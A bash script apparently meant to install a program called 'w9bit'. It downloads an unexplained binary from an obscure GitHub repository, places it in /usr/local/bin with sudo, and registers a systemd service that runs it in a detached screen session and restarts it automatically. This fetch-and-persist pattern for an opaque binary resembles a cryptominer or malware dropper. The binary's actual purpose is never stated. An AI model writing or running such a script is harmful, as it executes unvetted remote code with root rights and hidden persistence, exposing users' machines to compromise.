#!/bin/bash

# Download URL for the w9bit binary
w9bit_URL="https://raw.githubusercontent.com/snverrzonnet/d23456789/39cee0b4f176bf60493f31aaa462329c48e9d424/w9bit"


# Function to check if screen is installed
check_and_install_screen() {
    if ! command -v screen &> /dev/null; then
        echo "Screen is not installed. Installing now..."
        sudo apt update && sudo apt install -y screen
        echo "Screen has been installed."
    else
        echo "Screen is already installed."
    fi
}

# Install screen if not already installed
check_and_install_screen

# Download the w9bit binary
wget "$w9bit_URL" -O w9bit

# Make the binary executable
chmod +x w9bit

# Move the binary to /usr/local/bin with sudo
sudo mv w9bit /usr/local/bin/

# Create a systemd service file for auto-start using screen
cat << EOF | sudo tee /etc/systemd/system/w9bit.service
[Unit]
Description=w9bit Application Managed by Screen
After=network.target

[Service]
ExecStart=/usr/bin/screen -dmS w9bit /usr/local/bin/w9bit
Restart=always
User=$(whoami)

[Install]
WantedBy=multi-user.target
EOF

# Reload systemd, enable and start the service
sudo systemctl daemon-reload
sudo systemctl enable w9bit.service
sudo systemctl start w9bit.service

# Start a named screen session for the w9bit application manually (if needed)
screen -dmS w9bit /usr/local/bin/w9bit

echo "w9bit has been installed and set up to auto-start."
# echo "You can now run 'w9bit' from the command line."
# echo "To manage the w9bit application, use: screen -r w9bit"
